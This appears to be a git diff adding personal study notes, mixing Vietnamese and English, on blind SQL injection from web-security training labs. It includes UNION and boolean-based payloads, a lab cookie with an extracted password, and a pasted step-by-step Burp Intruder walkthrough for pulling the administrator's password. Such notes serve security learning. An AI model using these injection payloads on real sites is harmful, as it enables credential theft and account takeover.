@@ -91,4 +91,76 @@ step 4:GET /filter?category='+UNION+SELECT+column_name,+NULL+FROM+information_sc
 final: GET /filter?category='+UNION+SELECT+password_khkmee+,username_hjhyfp+FROM+users_tntqft-- HTTP/2 => get administrator and password of it
 
 
+-Blind SQL injection
+-What is blind SQL injection?
++Không có thông tin trả về từ http rep => tự suy luận lỗi dựa trên các kết quả
+  +Boolean-based Blind SQLi: Ứng dụng trả kết quả khác nhau (ví dụ: khác nội dung, khác độ dài trang) tùy vào mệnh đề SQL đúng/sai.
+  +Time-based Blind SQLi: Ứng dụng phản hồi chậm lại (delay) nếu một điều kiện trong SQL đúng.
+=>UNION attack không hiệu quả
+
+-Exploiting blind SQL injection by triggering conditional responses
++…xyz' AND '1'='1
+…xyz' AND '1'='2
+=> chèn điều kiện đúng kết quả có thể nhận là "welcome back" hay tương tự như vậy, còn với điều kiện sai thì nó sẽ không trả gì => khai thác băng việc gởi từng bit điều kiện để kiểm tra db
+
++xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm    => 't => = 's
+điều này có nghĩa, nếu rep là welcome back => điều kiện đúng => kí tự đầu tiên trong mật khẩu lớn hơn m trong bảng ascii ==> tiếp tục chẻ đôi tại t và cuối cùng xác nhận nó là s
++tượng tự nếu rep sai => nó sẽ nhỏ hơn => cứ dùng binary search để chẻ đôi thì sẽ khá nhanh
+
++lab: Cookie: TrackingId=Vt1SCZoS78pO83Ry' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 8, 1) = 'l; session=7CSLlrxoWHIxdFWNAiLAtavTWoHQ1RBM
+=>7mni43cl8qrj8t7h0ydu dò từng cái ra pass này
+Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie. For simplicity, let's say the original value of the cookie is TrackingId=xyz.
+Modify the TrackingId cookie, changing it to:
+
+TrackingId=xyz' AND '1'='1
+Verify that the Welcome back message appears in the response.
+
+Now change it to:
+
+TrackingId=xyz' AND '1'='2
+Verify that the Welcome back message does not appear in the response. This demonstrates how you can test a single boolean condition and infer the result.
+
+Now change it to:
+
+TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
+Verify that the condition is true, confirming that there is a table called users.
+
+Now change it to:
+
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+Verify that the condition is true, confirming that there is a user called administrator.
+
+The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to:
+
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+This condition should be true, confirming that the password is greater than 1 character in length.
+
+Send a series of follow-up values to test different password lengths. Send:
+
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
+Then send:
+
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
+And so on. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the Welcome back message disappears), you have determined the length of the password, which is in fact 20 characters long.
+
+After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.
+In Burp Intruder, change the value of the cookie to:
+
+TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+This uses the SUBSTRING() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
+
+Place payload position markers around the final a character in the cookie value. To do this, select just the a, and click the Add § button. You should then see the following as the cookie value (note the payload position markers):
+
+TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
+To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. In the Payloads side panel, check that Simple list is selected, and under Payload configuration add the payloads in the range a - z and 0 - 9. You can select these easily using the Add from list drop-down.
+To be able to tell when the correct character was submitted, you'll need to grep each response for the expression Welcome back. To do this, click on the  Settings tab to open the Settings side panel. In the Grep - Match section, clear existing entries in the list, then add the value Welcome back.
+Launch the attack by clicking the  Start attack button.
+Review the attack results to find the value of the character at the first position. You should see a column in the results called Welcome back. One of the rows should have a tick in this column. The payload showing for that row is the value of the character at the first position.
+Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the Intruder tab, and change the specified offset from 1 to 2. You should then see the following as the cookie value:
+
+TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
+Launch the modified attack, review the results, and note the character at the second offset.
+Continue this process testing offset 3, 4, and so on, until you have the whole password.
+In the browser, click My account to open the login page. Use the password to log in as the administrator user.
+
 
